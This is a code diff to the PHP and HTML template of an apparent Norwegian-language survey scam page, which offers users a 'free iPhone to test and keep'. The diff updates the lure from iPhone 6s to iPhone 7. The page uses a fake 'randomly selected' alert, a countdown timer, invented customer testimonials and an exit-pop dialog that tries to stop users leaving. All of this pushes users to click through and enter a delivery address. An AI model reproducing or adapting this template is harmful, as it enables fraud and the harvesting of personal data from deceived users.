@@ -18,7 +18,7 @@
 	<body>
 		<div class="header">
 			<p>
-				<span>iPhone</span>&nbsp;&nbsp;&nbsp;Watch&nbsp;&nbsp;&nbsp;iPad&nbsp;&nbsp;&nbsp;Mac
+				<span>iPhone 7</span>&nbsp;&nbsp;&nbsp;Watch&nbsp;&nbsp;&nbsp;iPad&nbsp;&nbsp;&nbsp;Mac
 			</p>
 		</div>
 		<div class="content">
@@ -29,12 +29,12 @@
 			</p>
 			<div class="main-content flag" style="    background: url(<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/flag-no.png) #fff no-repeat 98% 20px;" id="content1">
 				<h1>TEST OG BEHOLD</h1>
-				<h2>Din enhet har blitt tilfeldig valgt til å teste den splitter nye iPhone-6s! Etter at du testet den kan du BEHOLDE den!</h2>
+				<h2>Din enhet har blitt tilfeldig valgt til å teste den splitter nye iPhone 7! Etter at du testet den kan du BEHOLDE den!</h2>
 				<p>
-					Dette er ikke en spøk! Du er invitert til å delta i testing av vår splitter nye iPhone-6s. Vi leter etter <strong style="color: #084BBF;">(3) flere brukere</strong> om tilbakemelding slik at vi kan gjøre den kommende iPhone 7 den beste iPhone noensinne.
+					Dette er ikke en spøk! Du er invitert til å delta i testing av vår splitter nye iPhone 7. Vi leter etter <strong style="color: #084BBF;">(3) flere brukere</strong> om tilbakemelding slik at vi kan gjøre den kommende iPhone 7 den beste iPhone noensinne.
 				
 				</p>
-				<p>Hvis du ønsker å være en del av denne private testgruppen, svar på følgende 4 spørsmål å gi oss noen verdifulle tilbakemeldinger. Som "takk" du vil få beholde den splitter nye iPhone 6s 16GB, gratis etter å ha testet den! Du har <font color="red"><b><span id="mins">2</span> minutter og <span id="hsecs">59</span> sekunder</b></font> til å svare, hvis ikke vil vi velge en annen kandidat!</p>
+				<p>Hvis du ønsker å være en del av denne private testgruppen, svar på følgende 4 spørsmål å gi oss noen verdifulle tilbakemeldinger. Som "takk" du vil få beholde den splitter nye iPhone 7, gratis etter å ha testet den! Du har <font color="red"><b><span id="mins">2</span> minutter og <span id="hsecs">59</span> sekunder</b></font> til å svare, hvis ikke vil vi velge en annen kandidat!</p>
 
 				<div id="q1">
 					<p class="question">
@@ -71,7 +71,7 @@
 				</div>
 				<div id="q4">
 					<p class="question">
-						<strong>Spørsmål 4 av 4:</strong> Har du en gyldig leveringsadresse, slik at du kan få din iPhone 6s?
+						<strong>Spørsmål 4 av 4:</strong> Har du en gyldig leveringsadresse, slik at du kan få din iPhone 7?
 					</p>
 					<div class="button bq4">
 						Ja
@@ -93,14 +93,14 @@
 
 				</p>
 				<p class="result" id="result3">
-					Du har kvalifisert seg for ( 1 ) iPhone 6s + Apple T - skjorte
+					Du har kvalifisert seg for ( 1 ) iPhone 7 + Apple T - skjorte
 
 
 				</p>
 			</div>
 			<div class="main-content" id="content3">
 				<h1 style="text-align:center;">Gratulerer! Du er kvilifisert til å bli med i denne private test gruppen!</h1>
-				<h2 style="text-align: center">Klikk på knappen under for å kvalifisere deg for en gratis iPhone-6s som en takk for å delta i undersøkelsen.</h2>
+				<h2 style="text-align: center">Klikk på knappen under for å kvalifisere deg for en gratis iPhone 7 som en takk for å delta i undersøkelsen.</h2>
 				<h2 style="text-align:center;"><strong>KVALIFISER DEG FOR Å MOTTA GAVEN</strong></h2>
 			<p class="loading">
 						<?php
@@ -132,7 +132,7 @@
 						//}
 					?>
 					
-					<a onclick="PreventExitPop = false;" href="<?php echo $buttonURL?>"><img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/iphone6.png"></a>
+					<a onclick="PreventExitPop = false;" href="<?php echo $buttonURL?>"><img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/iphone7.png"></a>
 				</p>
 				<a href="<?php echo $buttonURL?>" onclick="PreventExitPop = false;" class="claim">
 				
@@ -140,7 +140,7 @@
 					Gjør krav på gaven din
 				</div></a>
 				<p style="text-align:center;">
-					Skriv inn riktig leveringsadresse på neste side for å kvalifisere deg for en gratis iPhone-6s. Lagret er begrenset, så vær rask!
+					Skriv inn riktig leveringsadresse på neste side for å kvalifisere deg for en gratis iPhone 7. Lagret er begrenset, så vær rask!
 				</p>
 			</div>
 			<div class="main-content">
@@ -215,7 +215,7 @@
 							Marc Harvey
 						</p>
 						<p>
-							Trodde at det var en spøk, men i dag kom det een iPhone-6s og en stor T - skjorte i posten. Nå ønsker jeg å gjøre flere undersøkelser! lol
+							Trodde at det var en spøk, men i dag kom det een iPhone 7 og en stor T - skjorte i posten. Nå ønsker jeg å gjøre flere undersøkelser! lol
 							<br>
 							<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/item2.png">
 						</p>
@@ -257,7 +257,7 @@
 							Paul Rogger
 						</p>
 						<p>
-							Jeg har sett dette før, men ignorerte det fordi jeg trodde det var bortkastet tid. Nå har jeg selv sett og tatt del i dette. Nettopp fått en iPhone 6s. Drit kult!
+							Jeg har sett dette før, men ignorerte det fordi jeg trodde det var bortkastet tid. Nå har jeg selv sett og tatt del i dette. Nettopp fått en iPhone 7. Drit kult!
 						</p>
 					</div>
 					<div class="clr"></div>
@@ -332,7 +332,7 @@
 				return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
 			}
 
-			alert("GRATULERER bruker !\n\Your Din enhet ble valgt fordi vi trenger flere testere for de nye iPhone-6s i påvente for utgivelsen av den kommende iPhone 7.\n\nKlikk OK for å bli med og du kan beholde en helt NY iPhone 6s etter du har testet den. ");
+			alert("GRATULERER bruker !\n\Your Din enhet ble valgt fordi vi trenger flere testere for de nye iPhone 7 i påvente for utgivelsen av den kommende iPhone 7.\n\nKlikk OK for å bli med og du kan beholde en helt NY iPhone 7 etter du har testet den. ");
 
 			setInterval('countdown()', 1000);
 			function countdown() {
@@ -358,7 +358,7 @@
 			 var PreventExitPop = true;
 			  function ExitPop() {
 			    if(PreventExitPop != false) {
-			      return "Er du sikker på at du vil forlate denne siden ?\n\nVi har tilfeldig valgt å stå en god sjanse til å være vår iPhone 6s vinner. Hvis du forlater siden , vil vi gi sjansen til noen andre\n\n---"
+			      return "Er du sikker på at du vil forlate denne siden ?\n\nVi har tilfeldig valgt å stå en god sjanse til å være vår iPhone 7 vinner. Hvis du forlater siden , vil vi gi sjansen til noen andre\n\n---"
 			    }
 			  }
 			  window.onbeforeunload = ExitPop;
